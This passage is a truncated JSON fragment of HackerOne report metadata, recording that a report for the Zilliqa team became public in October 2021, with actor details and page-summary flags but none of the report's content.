:false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-10-04T05:24:25.393Z","updated_at":"2021-10-04T05:24:25.393Z","actor":{"username":"ahook","cleared":true,"url":"/ahook","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/270/516/931454b97b577c930f46a6b4700371009df43735_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zilliqa","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}